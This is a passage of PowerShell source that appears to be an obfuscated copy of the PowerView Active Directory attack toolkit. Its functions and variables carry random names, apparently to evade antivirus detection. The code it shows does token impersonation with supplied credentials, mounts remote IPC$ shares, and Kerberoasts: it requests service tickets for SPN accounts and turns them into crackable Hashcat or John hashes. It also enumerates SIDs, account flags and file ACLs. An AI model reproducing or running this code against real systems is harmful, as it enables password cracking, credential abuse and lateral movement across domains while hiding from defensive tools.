                    'S-1-5-8'       { 'Proxy' }
                    'S-1-5-9'       { 'Enterprise Domain Controllers' }
                    'S-1-5-10'      { 'Principal Self' }
                    'S-1-5-11'      { 'Authenticated Users' }
                    'S-1-5-12'      { 'Restricted Code' }
                    'S-1-5-13'      { 'Terminal Server Users' }
                    'S-1-5-14'      { 'Remote Interactive Logon' }
                    'S-1-5-15'      { 'This Organization ' }
                    'S-1-5-17'      { 'This Organization ' }
                    'S-1-5-18'      { 'Local System' }
                    'S-1-5-19'      { 'NT Authority' }
                    'S-1-5-20'      { 'NT Authority' }
                    'S-1-5-80-0'    { 'All Services ' }
                    'S-1-5-32-544'  { 'BUILTIN\Administrators' }
                    'S-1-5-32-545'  { 'BUILTIN\Users' }
                    'S-1-5-32-546'  { 'BUILTIN\Guests' }
                    'S-1-5-32-547'  { 'BUILTIN\Power Users' }
                    'S-1-5-32-548'  { 'BUILTIN\Account Operators' }
                    'S-1-5-32-549'  { 'BUILTIN\Server Operators' }
                    'S-1-5-32-550'  { 'BUILTIN\Print Operators' }
                    'S-1-5-32-551'  { 'BUILTIN\Backup Operators' }
                    'S-1-5-32-552'  { 'BUILTIN\Replicators' }
                    'S-1-5-32-554'  { 'BUILTIN\Pre-Windows 2000 Compatible Access' }
                    'S-1-5-32-555'  { 'BUILTIN\Remote Desktop Users' }
                    'S-1-5-32-556'  { 'BUILTIN\Network Configuration Operators' }
                    'S-1-5-32-557'  { 'BUILTIN\Incoming Forest Trust Builders' }
                    'S-1-5-32-558'  { 'BUILTIN\Performance Monitor Users' }
                    'S-1-5-32-559'  { 'BUILTIN\Performance Log Users' }
                    'S-1-5-32-560'  { 'BUILTIN\Windows Authorization Access Group' }
                    'S-1-5-32-561'  { 'BUILTIN\Terminal Server License Servers' }
                    'S-1-5-32-562'  { 'BUILTIN\Distributed COM Users' }
                    'S-1-5-32-569'  { 'BUILTIN\Cryptographic Operators' }
                    'S-1-5-32-573'  { 'BUILTIN\Event Log Readers' }
                    'S-1-5-32-574'  { 'BUILTIN\Certificate Service DCOM Access' }
                    'S-1-5-32-575'  { 'BUILTIN\RDS Remote Access Servers' }
                    'S-1-5-32-576'  { 'BUILTIN\RDS Endpoint Servers' }
                    'S-1-5-32-577'  { 'BUILTIN\RDS Management Servers' }
                    'S-1-5-32-578'  { 'BUILTIN\Hyper-V Administrators' }
                    'S-1-5-32-579'  { 'BUILTIN\Access Control Assistance Operators' }
                    'S-1-5-32-580'  { 'BUILTIN\Access Control Assistance Operators' }
                    Default {
                        macrocosms -phaEiMpW99 $SLqiOELZ99 @ADNameArguments
                    }
                }
            }
            catch {
                Write-Verbose "[exaggerations] Error converting SID '$SLqiOELZ99' : $_"
            }
        }
    }
}
function macrocosms {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name', 'ObjectName')]
        [String[]]
        $phaEiMpW99,
        [String]
        [ValidateSet('DN', 'Canonical', 'NT4', 'Display', 'DomainSimple', 'EnterpriseSimple', 'GUID', 'Unknown', 'UPN', 'CanonicalEx', 'SPN')]
        $xilKAxpM99,
        [ValidateNotNullOrEmpty()]
        [String]
        $gddrYpaX99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GejzMkbd99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $lZXGVZEh99 = @{
            'DN'                =   1  # CN=Phineas Flynn,OU=Engineers,DC=fabrikam,DC=com
            'Canonical'         =   2  # fabrikam.com/Engineers/Phineas Flynn
            'NT4'               =   3  # fabrikam\pflynn
            'Display'           =   4  # pflynn
            'DomainSimple'      =   5  # pflynn@fabrikam.com
            'EnterpriseSimple'  =   6  # pflynn@fabrikam.com
            'GUID'              =   7  # {95ee9fff-3436-11d1-b2b0-d15ae3ac8436}
            'Unknown'           =   8  # unknown type - let the server do translation
            'UPN'               =   9  # pflynn@fabrikam.com
            'CanonicalEx'       =   10 # fabrikam.com/Users/Phineas Flynn
            'SPN'               =   11 # HTTP/kairomac.contoso.com
            'SID'               =   12 # S-1-5-21-12986231-600641547-709122288-57999
        }
        function Invoke-Method([__ComObject] $Object, [String] $yCCcshgi99, $EKyZOJXr99) {
            $jmVDoyyB99 = $Null
            $jmVDoyyB99 = $Object.GetType().InvokeMember($yCCcshgi99, 'InvokeMethod', $NULL, $Object, $EKyZOJXr99)
            Write-Output $jmVDoyyB99
        }
        function Get-Property([__ComObject] $Object, [String] $JxONuYFP99) {
            $Object.GetType().InvokeMember($JxONuYFP99, 'GetProperty', $NULL, $Object, $NULL)
        }
        function Set-Property([__ComObject] $Object, [String] $JxONuYFP99, $EKyZOJXr99) {
            [Void] $Object.GetType().InvokeMember($JxONuYFP99, 'SetProperty', $NULL, $Object, $EKyZOJXr99)
        }
        if ($PSBoundParameters['Server']) {
            $hOlOutDe99 = 2
            $chUNHZsQ99 = $GejzMkbd99
        }
        elseif ($PSBoundParameters['Domain']) {
            $hOlOutDe99 = 1
            $chUNHZsQ99 = $gddrYpaX99
        }
        elseif ($PSBoundParameters['Credential']) {
            $Cred = $xjRyyQze99.GetNetworkCredential()
            $hOlOutDe99 = 1
            $chUNHZsQ99 = $Cred.Domain
        }
        else {
            $hOlOutDe99 = 3
            $chUNHZsQ99 = $Null
        }
    }
    PROCESS {
        ForEach ($RwjEVSPw99 in $phaEiMpW99) {
            if (-not $PSBoundParameters['OutputType']) {
                if ($RwjEVSPw99 -match "^[A-Za-z]+\\[A-Za-z ]+") {
                    $TrorQjdJ99 = $lZXGVZEh99['DomainSimple']
                }
                else {
                    $TrorQjdJ99 = $lZXGVZEh99['NT4']
                }
            }
            else {
                $TrorQjdJ99 = $lZXGVZEh99[$xilKAxpM99]
            }
            $uhuVvtEq99 = New-Object -ComObject NameTranslate
            if ($PSBoundParameters['Credential']) {
                try {
                    $Cred = $xjRyyQze99.GetNetworkCredential()
                    Invoke-Method $uhuVvtEq99 'InitEx' (
                        $hOlOutDe99,
                        $chUNHZsQ99,
                        $Cred.UserName,
                        $Cred.Domain,
                        $Cred.Password
                    )
                }
                catch {
                    Write-Verbose "[macrocosms] Error initializing translation for '$phaEiMpW99' using alternate credentials : $_"
                }
            }
            else {
                try {
                    $Null = Invoke-Method $uhuVvtEq99 'Init' (
                        $hOlOutDe99,
                        $chUNHZsQ99
                    )
                }
                catch {
                    Write-Verbose "[macrocosms] Error initializing translation for '$phaEiMpW99' : $_"
                }
            }
            Set-Property $uhuVvtEq99 'ChaseReferral' (0x60)
            try {
                $Null = Invoke-Method $uhuVvtEq99 'Set' (8, $RwjEVSPw99)
                Invoke-Method $uhuVvtEq99 'Get' ($TrorQjdJ99)
            }
            catch [System.Management.Automation.MethodInvocationException] {
                Write-Verbose "[macrocosms] Error translating '$RwjEVSPw99' : $($_.Exception.InnerException.Message)"
            }
        }
    }
}
function pwns {
    [OutputType('System.Collections.Specialized.OrderedDictionary')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('UAC', 'useraccountcontrol')]
        [Int]
        $Value,
        [Switch]
        $UcLCSjsJ99
    )
    BEGIN {
        $jjrwUIHK99 = New-Object System.Collections.Specialized.OrderedDictionary
        $jjrwUIHK99.Add("SCRIPT", 1)
        $jjrwUIHK99.Add("ACCOUNTDISABLE", 2)
        $jjrwUIHK99.Add("HOMEDIR_REQUIRED", 8)
        $jjrwUIHK99.Add("LOCKOUT", 16)
        $jjrwUIHK99.Add("PASSWD_NOTREQD", 32)
        $jjrwUIHK99.Add("PASSWD_CANT_CHANGE", 64)
        $jjrwUIHK99.Add("ENCRYPTED_TEXT_PWD_ALLOWED", 128)
        $jjrwUIHK99.Add("TEMP_DUPLICATE_ACCOUNT", 256)
        $jjrwUIHK99.Add("NORMAL_ACCOUNT", 512)
        $jjrwUIHK99.Add("INTERDOMAIN_TRUST_ACCOUNT", 2048)
        $jjrwUIHK99.Add("WORKSTATION_TRUST_ACCOUNT", 4096)
        $jjrwUIHK99.Add("SERVER_TRUST_ACCOUNT", 8192)
        $jjrwUIHK99.Add("DONT_EXPIRE_PASSWORD", 65536)
        $jjrwUIHK99.Add("MNS_LOGON_ACCOUNT", 131072)
        $jjrwUIHK99.Add("SMARTCARD_REQUIRED", 262144)
        $jjrwUIHK99.Add("TRUSTED_FOR_DELEGATION", 524288)
        $jjrwUIHK99.Add("NOT_DELEGATED", 1048576)
        $jjrwUIHK99.Add("USE_DES_KEY_ONLY", 2097152)
        $jjrwUIHK99.Add("DONT_REQ_PREAUTH", 4194304)
        $jjrwUIHK99.Add("PASSWORD_EXPIRED", 8388608)
        $jjrwUIHK99.Add("TRUSTED_TO_AUTH_FOR_DELEGATION", 16777216)
        $jjrwUIHK99.Add("PARTIAL_SECRETS_ACCOUNT", 67108864)
    }
    PROCESS {
        $kHjlLXBH99 = New-Object System.Collections.Specialized.OrderedDictionary
        if ($UcLCSjsJ99) {
            ForEach ($TSzPfUTg99 in $jjrwUIHK99.GetEnumerator()) {
                if ( ($Value -band $TSzPfUTg99.Value) -eq $TSzPfUTg99.Value) {
                    $kHjlLXBH99.Add($TSzPfUTg99.Name, "$($TSzPfUTg99.Value)+")
                }
                else {
                    $kHjlLXBH99.Add($TSzPfUTg99.Name, "$($TSzPfUTg99.Value)")
                }
            }
        }
        else {
            ForEach ($TSzPfUTg99 in $jjrwUIHK99.GetEnumerator()) {
                if ( ($Value -band $TSzPfUTg99.Value) -eq $TSzPfUTg99.Value) {
                    $kHjlLXBH99.Add($TSzPfUTg99.Name, "$($TSzPfUTg99.Value)")
                }
            }
        }
        $kHjlLXBH99
    }
}
function optics {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $phaEiMpW99,
        [ValidateNotNullOrEmpty()]
        [String]
        $gddrYpaX99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    Add-Type -AssemblyName System.DirectoryServices.AccountManagement
    try {
        if ($PSBoundParameters['Domain'] -or ($phaEiMpW99 -match '.+\\.+')) {
            if ($phaEiMpW99 -match '.+\\.+') {
                $dySPqvcY99 = $phaEiMpW99 | macrocosms -xilKAxpM99 Canonical
                if ($dySPqvcY99) {
                    $FpiJsutU99 = $dySPqvcY99.SubString(0, $dySPqvcY99.IndexOf('/'))
                    $zWSWPcGY99 = $phaEiMpW99.Split('\')[1]
                    Write-Verbose "[optics] Binding to domain '$FpiJsutU99'"
                }
            }
            else {
                $zWSWPcGY99 = $phaEiMpW99
                Write-Verbose "[optics] Binding to domain '$gddrYpaX99'"
                $FpiJsutU99 = $gddrYpaX99
            }
            if ($PSBoundParameters['Credential']) {
                Write-Verbose '[optics] Using alternate credentials'
                $OWKsdjuY99 = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $FpiJsutU99, $xjRyyQze99.UserName, $xjRyyQze99.GetNetworkCredential().Password)
            }
            else {
                $OWKsdjuY99 = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $FpiJsutU99)
            }
        }
        else {
            if ($PSBoundParameters['Credential']) {
                Write-Verbose '[optics] Using alternate credentials'
                $eauIgFqY99 = retrenchments | Select-Object -ExpandProperty Name
                $OWKsdjuY99 = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $eauIgFqY99, $xjRyyQze99.UserName, $xjRyyQze99.GetNetworkCredential().Password)
            }
            else {
                $OWKsdjuY99 = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)
            }
            $zWSWPcGY99 = $phaEiMpW99
        }
        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'Context' $OWKsdjuY99
        $Out | Add-Member Noteproperty 'Identity' $zWSWPcGY99
        $Out
    }
    catch {
        Write-Warning "[optics] Error creating binding for object ('$phaEiMpW99') context : $_"
    }
}
function unhooking {
    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $lgkTdAeF99,
        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $Path,
        [Parameter(Mandatory = $True)]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99
    )
    BEGIN {
        $gNyMUBLz99 = [Activator]::CreateInstance($yTSgXfIS99)
        $gNyMUBLz99.dwType = 1
    }
    PROCESS {
        $Paths = @()
        if ($PSBoundParameters['ComputerName']) {
            ForEach ($kungVfvV99 in $lgkTdAeF99) {
                $kungVfvV99 = $kungVfvV99.Trim('\')
                $Paths += ,"\\$kungVfvV99\IPC$"
            }
        }
        else {
            $Paths += ,$Path
        }
        ForEach ($WVpqhVQc99 in $Paths) {
            $gNyMUBLz99.lpRemoteName = $WVpqhVQc99
            Write-Verbose "[unhooking] Attempting to mount: $WVpqhVQc99"
            $XUqUetvM99 = $Mpr::WNetAddConnection2W($gNyMUBLz99, $xjRyyQze99.GetNetworkCredential().Password, $xjRyyQze99.UserName, 4)
            if ($XUqUetvM99 -eq 0) {
                Write-Verbose "$WVpqhVQc99 successfully mounted"
            }
            else {
                Throw "[unhooking] error mounting $WVpqhVQc99 : $(([ComponentModel.Win32Exception]$XUqUetvM99).Message)"
            }
        }
    }
}
function shoeing {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $lgkTdAeF99,
        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $Path
    )
    PROCESS {
        $Paths = @()
        if ($PSBoundParameters['ComputerName']) {
            ForEach ($kungVfvV99 in $lgkTdAeF99) {
                $kungVfvV99 = $kungVfvV99.Trim('\')
                $Paths += ,"\\$kungVfvV99\IPC$"
            }
        }
        else {
            $Paths += ,$Path
        }
        ForEach ($WVpqhVQc99 in $Paths) {
            Write-Verbose "[shoeing] Attempting to unmount: $WVpqhVQc99"
            $XUqUetvM99 = $Mpr::WNetCancelConnection2($WVpqhVQc99, 0, $True)
            if ($XUqUetvM99 -eq 0) {
                Write-Verbose "$WVpqhVQc99 successfully ummounted"
            }
            else {
                Throw "[shoeing] error unmounting $WVpqhVQc99 : $(([ComponentModel.Win32Exception]$XUqUetvM99).Message)"
            }
        }
    }
}
function properest {
    [OutputType([IntPtr])]
    [CmdletBinding(DefaultParameterSetName = 'Credential')]
    Param(
        [Parameter(Mandatory = $True, ParameterSetName = 'Credential')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99,
        [Parameter(Mandatory = $True, ParameterSetName = 'TokenHandle')]
        [ValidateNotNull()]
        [IntPtr]
        $hChekWvA99,
        [Switch]
        $Quiet
    )
    if (([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') -and (-not $PSBoundParameters['Quiet'])) {
        Write-Warning "[properest] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work."
    }
    if ($PSBoundParameters['TokenHandle']) {
        $JQGbvgMk99 = $hChekWvA99
    }
    else {
        $JQGbvgMk99 = [IntPtr]::Zero
        $krmQzDki99 = $xjRyyQze99.GetNetworkCredential()
        $qgzVOkSs99 = $krmQzDki99.Domain
        $QuaUtxHk99 = $krmQzDki99.UserName
        Write-Warning "[properest] Executing LogonUser() with user: $($qgzVOkSs99)\$($QuaUtxHk99)"
        $XUqUetvM99 = $tXXKHaBR99::LogonUser($QuaUtxHk99, $qgzVOkSs99, $krmQzDki99.Password, 9, 3, [ref]$JQGbvgMk99);$LgkmIaxQ99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();
        if (-not $XUqUetvM99) {
            throw "[properest] LogonUser() Error: $(([ComponentModel.Win32Exception] $LgkmIaxQ99).Message)"
        }
    }
    $XUqUetvM99 = $tXXKHaBR99::ImpersonateLoggedOnUser($JQGbvgMk99)
    if (-not $XUqUetvM99) {
        throw "[properest] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $LgkmIaxQ99).Message)"
    }
    Write-Verbose "[properest] Alternate credentials successfully impersonated"
    $JQGbvgMk99
}
function flake {
    [CmdletBinding()]
    Param(
        [ValidateNotNull()]
        [IntPtr]
        $hChekWvA99
    )
    if ($PSBoundParameters['TokenHandle']) {
        Write-Warning "[flake] Reverting token impersonation and closing LogonUser() token handle"
        $XUqUetvM99 = $Kernel32::CloseHandle($hChekWvA99)
    }
    $XUqUetvM99 = $tXXKHaBR99::RevertToSelf();$LgkmIaxQ99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();
    if (-not $XUqUetvM99) {
        throw "[flake] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $LgkmIaxQ99).Message)"
    }
    Write-Verbose "[flake] Token impersonation successfully reverted"
}
function hobbyhorse {
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding(DefaultParameterSetName = 'RawSPN')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidatePattern('.*/.*')]
        [Alias('ServicePrincipalName')]
        [String[]]
        $SPN,
        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateScript({ $_.PSObject.TypeNames[0] -eq 'PowerView.User' })]
        [Object[]]
        $User,
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $ZjolXFPo99 = 'Hashcat',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')
        if ($PSBoundParameters['Credential']) {
            $sufTyDkO99 = properest -xjRyyQze99 $xjRyyQze99
        }
    }
    PROCESS {
        if ($PSBoundParameters['User']) {
            $SJlKmTct99 = $User
        }
        else {
            $SJlKmTct99 = $SPN
        }
        ForEach ($Object in $SJlKmTct99) {
            if ($PSBoundParameters['User']) {
                $vAxoQRgE99 = $Object.ServicePrincipalName
                $ryaimXPz99 = $Object.SamAccountName
                $SzdNnNzd99 = $Object.DistinguishedName
            }
            else {
                $vAxoQRgE99 = $Object
                $ryaimXPz99 = 'UNKNOWN'
                $SzdNnNzd99 = 'UNKNOWN'
            }
            if ($vAxoQRgE99 -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                $vAxoQRgE99 = $vAxoQRgE99[0]
            }
            try {
                $ddadAzWC99 = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $vAxoQRgE99
            }
            catch {
                Write-Warning "[hobbyhorse] Error requesting ticket for SPN '$vAxoQRgE99' from user '$SzdNnNzd99' : $_"
            }
            if ($ddadAzWC99) {
                $BIUIHNSN99 = $ddadAzWC99.GetRequest()
            }
            if ($BIUIHNSN99) {
                $Out = New-Object PSObject
                $rqAjLPKl99 = [System.BitConverter]::ToString($BIUIHNSN99) -replace '-'
                $Out | Add-Member Noteproperty 'SamAccountName' $ryaimXPz99
                $Out | Add-Member Noteproperty 'DistinguishedName' $SzdNnNzd99
                $Out | Add-Member Noteproperty 'ServicePrincipalName' $ddadAzWC99.ServicePrincipalName
                if($rqAjLPKl99 -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                    $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
                    $dSotUJxr99 = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
                    $UnWNMEkw99 = $Matches.DataToEnd.Substring(0,$dSotUJxr99*2)
                    if($Matches.DataToEnd.Substring($dSotUJxr99*2, 4) -ne 'A482') {
                        Write-Warning "Error parsing ciphertext for the SPN  $($ddadAzWC99.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                        $Hash = $null
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($BIUIHNSN99).Replace('-',''))
                    } else {
                        $Hash = "$($UnWNMEkw99.Substring(0,32))`$$($UnWNMEkw99.Substring(32))"
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' $null
                    }
                } else {
                    Write-Warning "Unable to parse ticket structure for the SPN  $($ddadAzWC99.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                    $Hash = $null
                    $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($BIUIHNSN99).Replace('-',''))
                }
                if($Hash) {
                    if ($ZjolXFPo99 -match 'John') {
                        $loInhYwY99 = "`$BPtAtrEm99`$$($ddadAzWC99.ServicePrincipalName):$Hash"
                    }
                    else {
                        if ($SzdNnNzd99 -ne 'UNKNOWN') {
                            $qgzVOkSs99 = $SzdNnNzd99.SubString($SzdNnNzd99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                        else {
                            $qgzVOkSs99 = 'UNKNOWN'
                        }
                        $loInhYwY99 = "`$BPtAtrEm99`$$($Etype)`$*$ryaimXPz99`$$qgzVOkSs99`$$($ddadAzWC99.ServicePrincipalName)*`$$Hash"
                    }
                    $Out | Add-Member Noteproperty 'Hash' $loInhYwY99
                }
                $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
                $Out
            }
        }
    }
    END {
        if ($sufTyDkO99) {
            flake -hChekWvA99 $sufTyDkO99
        }
    }
}
function engineer {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $phaEiMpW99,
        [ValidateNotNullOrEmpty()]
        [String]
        $gddrYpaX99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $vqxjYeAS99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $kNJfXSCC99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GejzMkbd99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $yuycROvu99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $vUSyLBJJ99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $cNGaYdSy99,
        [Switch]
        $kQTByXSX99,
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $ZjolXFPo99 = 'Hashcat',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $UYMYjrtp99 = @{
            'SPN' = $True
            'Properties' = 'samaccountname,distinguishedname,serviceprincipalname'
        }
        if ($PSBoundParameters['Domain']) { $UYMYjrtp99['Domain'] = $gddrYpaX99 }
        if ($PSBoundParameters['LDAPFilter']) { $UYMYjrtp99['LDAPFilter'] = $vqxjYeAS99 }
        if ($PSBoundParameters['SearchBase']) { $UYMYjrtp99['SearchBase'] = $kNJfXSCC99 }
        if ($PSBoundParameters['Server']) { $UYMYjrtp99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['SearchScope']) { $UYMYjrtp99['SearchScope'] = $yuycROvu99 }
        if ($PSBoundParameters['ResultPageSize']) { $UYMYjrtp99['ResultPageSize'] = $vUSyLBJJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $UYMYjrtp99['ServerTimeLimit'] = $cNGaYdSy99 }
        if ($PSBoundParameters['Tombstone']) { $UYMYjrtp99['Tombstone'] = $kQTByXSX99 }
        if ($PSBoundParameters['Credential']) { $UYMYjrtp99['Credential'] = $xjRyyQze99 }
        if ($PSBoundParameters['Credential']) {
            $sufTyDkO99 = properest -xjRyyQze99 $xjRyyQze99
        }
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $UYMYjrtp99['Identity'] = $phaEiMpW99 }
        wasteland @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | hobbyhorse -ZjolXFPo99 $ZjolXFPo99
    }
    END {
        if ($sufTyDkO99) {
            flake -hChekWvA99 $sufTyDkO99
        }
    }
}
function knights {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FileACL')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName')]
        [String[]]
        $Path,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        function horny {
            [CmdletBinding()]
            Param(
                [Int]
                $FSR
            )
            $AccessMask = @{
                [uint32]'0x80000000' = 'GenericRead'
                [uint32]'0x40000000' = 'GenericWrite'
                [uint32]'0x20000000' = 'GenericExecute'
                [uint32]'0x10000000' = 'GenericAll'
                [uint32]'0x02000000' = 'MaximumAllowed'
                [uint32]'0x01000000' = 'AccessSystemSecurity'
                [uint32]'0x00100000' = 'Synchronize'
                [uint32]'0x00080000' = 'WriteOwner'
                [uint32]'0x00040000' = 'WriteDAC'
                [uint32]'0x00020000' = 'ReadControl'
                [uint32]'0x00010000' = 'Delete'
                [uint32]'0x00000100' = 'WriteAttributes'
                [uint32]'0x00000080' = 'ReadAttributes'
                [uint32]'0x00000040' = 'DeleteChild'
                [uint32]'0x00000020' = 'Execute/Traverse'
                [uint32]'0x00000010' = 'WriteExtendedAttributes'
                [uint32]'0x00000008' = 'ReadExtendedAttributes'
                [uint32]'0x00000004' = 'AppendData/AddSubdirectory'
                [uint32]'0x00000002' = 'WriteData/AddFile'
                [uint32]'0x00000001' = 'ReadData/ListDirectory'
            }
            $VcfxFOja99 = @{
                [uint32]'0x1f01ff' = 'FullControl'
                [uint32]'0x0301bf' = 'Modify'
                [uint32]'0x0200a9' = 'ReadAndExecute'
                [uint32]'0x02019f' = 'ReadAndWrite'
                [uint32]'0x020089' = 'Read'
                [uint32]'0x000116' = 'Write'
            }
            $oYXvCFPl99 = @()
            $oYXvCFPl99 += $VcfxFOja99.Keys | ForEach-Object {
                              if (($FSR -band $_) -eq $_) {
                                $VcfxFOja99[$_]
                                $FSR = $FSR -band (-not $_)
                              }
                            }
            $oYXvCFPl99 += $AccessMask.Keys | Where-Object { $FSR -band $_ } | ForEach-Object { $AccessMask[$_] }
            ($oYXvCFPl99 | Where-Object {$_}) -join ','
        }
        $mTIWqRmo99 = @{}
        if ($PSBoundParameters['Credential']) { $mTIWqRmo99['Credential'] = $xjRyyQze99 }
        $StuOJRFu99 = @{}
    }
    PROCESS {
        ForEach ($WVpqhVQc99 in $Path) {
            try {
                if (($WVpqhVQc99 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                    $tWXZQGKv99 = (New-Object System.Uri($WVpqhVQc99)).Host
                    if (-not $StuOJRFu99[$tWXZQGKv99]) {
                        unhooking -lgkTdAeF99 $tWXZQGKv99 -xjRyyQze99 $xjRyyQze99
                        $StuOJRFu99[$tWXZQGKv99] = $True
                    }
                }
                $ACL = Get-Acl -Path $WVpqhVQc99
                $ACL.GetAccessRules($True, $True, [System.Security.Principal.SecurityIdentifier]) | ForEach-Object {
                    $SID = $_.IdentityReference.Value
                    $Name = exaggerations -ObjectSID $SID @ConvertArguments
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'Path' $WVpqhVQc99
                    $Out | Add-Member Noteproperty 'FileSystemRights' (horny -FSR $_.FileSystemRights.value__)
                    $Out | Add-Member Noteproperty 'IdentityReference' $Name
                    $Out | Add-Member Noteproperty 'IdentitySID' $SID
                    $Out | Add-Member Noteproperty 'AccessControlType' $_.AccessControlType
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.FileACL')
                    $Out
                }
            }
            catch {
                Write-Verbose "[knights] error: $_"
            }
        }
    }
    END {
        $StuOJRFu99.Keys | shoeing
    }
}
function favorites {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        $PjvsRTzX99
    )
    $duEvkxCp99 = @{}
